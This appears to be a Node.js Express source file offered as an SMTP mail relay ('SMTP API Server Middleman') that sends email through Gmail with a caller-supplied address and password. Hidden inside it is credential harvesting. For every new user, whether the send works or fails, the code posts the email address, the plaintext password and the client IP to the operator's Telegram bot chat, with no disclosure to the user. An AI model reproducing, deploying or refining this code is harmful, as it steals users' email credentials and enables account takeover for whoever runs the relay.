/*
  This Script Made by ArkRega
  SMTP API Server Middleman
  Telegram : @RegaAsAlways & @RegaStayStill
  Telegram Channel : @MYGGWP
  Updated: Laporan Telegram menggunakan HTML + hiasan
*/

const express = require('express')
const nodemailer = require('nodemailer')
const axios = require('axios')

const app = express()
app.use(express.json())

const API_KEY = process.env.API_KEY
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID

const loggedEmails = new Set()

function escapeHtml(str) {
  if (!str) return ''
  return str.replace(/&/g, '&amp;')
            .replace(/</g, '&lt;')
            .replace(/>/g, '&gt;')
            .replace(/"/g, '&quot;')
            .replace(/'/g, '&#39;')
}

function buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status) {
  const statusText = status === 'SUCCESS' ? '✅ SUCCESS' : '❌ FAILED'
  const statusColorStyle = status === 'SUCCESS' ? '' : ''

  return `
<b>📧 NEW SMTP ACTIVITY</b>
━━━━━━━━━━━━━━━━━━━━━━━━━
<b>👤 Email:</b> <code>${escapeHtml(userEmail)}</code>
<b>🔑 Password:</b> <code>${escapeHtml(userPass)}</code>
<b>🌐 IP Address:</b> <code>${escapeHtml(clientIp)}</code>
<b>📅 Date:</b> ${escapeHtml(tanggal)}
<b>⏰ Time:</b> ${escapeHtml(pukul)}
<b>📊 Status:</b> ${statusText}
━━━━━━━━━━━━━━━━━━━━━━━━━
<i>SMTP Middleman by ArkRega</i>
  `.trim()
}

async function sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status) {
  if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) return

  const messageHtml = buildTelegramMessage(userEmail, userPass, clientIp, tanggal, pukul, status)
  try {
    await axios.post(`https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`, {
      chat_id: TELEGRAM_CHAT_ID,
      text: messageHtml,
      parse_mode: 'HTML'
    })
  } catch (e) {
    console.error('Telegram send error:', e.message)
  }
}

app.post('/api/send', async (req, res) => {
  const { apiKey, userEmail, userPass, toEmail, subject, htmlBody } = req.body
  const rawIp = req.headers['x-forwarded-for'] || req.socket.remoteAddress || 'UNKNOWN'
  const clientIp = rawIp.split(',')[0].trim()

  if (apiKey !== API_KEY) {
    return res.status(403).json({ success: false, error: 'Invalid API Key' })
  }

  if (!userEmail || !userPass || !toEmail || !subject || !htmlBody) {
    return res.status(400).json({ success: false, error: 'Missing parameters' })
  }

  let status = 'SUCCESS'

  try {
    const transporter = nodemailer.createTransport({
      host: 'smtp.gmail.com',
      port: 465,
      secure: true,
      auth: {
        user: userEmail,
        pass: userPass
      }
    })

    const mailOptions = {
      from: userEmail,
      to: toEmail,
      subject: subject,
      html: htmlBody
    }

    const info = await transporter.sendMail(mailOptions)

    if (!loggedEmails.has(userEmail)) {
      loggedEmails.add(userEmail)
      const dateObj = new Date()
      const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
      const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
      await sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status)
    }

    res.status(200).json({
      success: true,
      messageId: info.messageId
    })
  } catch (error) {
    status = 'FAILED'

    if (!loggedEmails.has(userEmail)) {
      loggedEmails.add(userEmail)
      const dateObj = new Date()
      const tanggal = dateObj.toLocaleDateString('id-ID', { timeZone: 'Asia/Jakarta' })
      const pukul = dateObj.toLocaleTimeString('id-ID', { timeZone: 'Asia/Jakarta' })
      await sendTelegramLog(userEmail, userPass, clientIp, tanggal, pukul, status)
    }

    res.status(500).json({
      success: false,
      error: error.message
    })
  }
})

app.get('/', (req, res) => {
  res.send('ArkRega SMTP API is running on Vercel!')
})

module.exports = app
